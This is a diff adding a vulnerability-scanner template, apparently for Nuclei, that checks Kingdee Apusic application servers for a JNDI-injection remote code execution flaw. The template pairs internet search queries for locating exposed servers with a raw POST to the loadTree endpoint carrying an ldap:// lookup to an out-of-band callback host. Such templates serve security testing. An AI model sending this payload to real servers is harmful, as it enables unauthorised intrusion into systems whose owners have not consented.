@@ -1,0 +1,42 @@
+id: kingdee_apusic_loadTree_rce
+info:
+  name: 金蝶 Apusic 应用服务器远程代码执行
+  author: Anonymous
+  severity: critical
+  description: 金蝶 Apusic loadTree接口执行JNDI注入，造成远程代码执行漏洞
+  metadata:
+    fofa-query: app="Apusic应用服务器"
+    quake-query: title:"欢迎使用Apusic应用服务器" OR title:"Welcome to Apusic Application Server"
+    hunter-query: web.title:"欢迎使用Apusic应用服务器" OR web.title:"Welcome to Apusic Application Server"
+    max-request: 1
+    verified: true
+  tags: rce,kingdee,hw,OA,jndi
+
+http:
+  - raw:
+      - |
+        POST /admin//protect/jndi/loadTree HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+        Cookie: JSESSIONID=wKi9shroVisovoFdubhBcEwfuJKmqgsKhO4A
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 39
+
+        jndiName=ldap://{{interactsh-url}}/
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+# digest: 4a0a004730450221009bc2908df7c0054859d34c2a85b55abc9498222e72a2bd3deca097b8eb28b6ed02206fcbaeb06a9f64821443bade9ec4fb7016af8911c6698e428e707ef39ce60846:6b2dd5af372f02ed15a56faf8ad98cf9
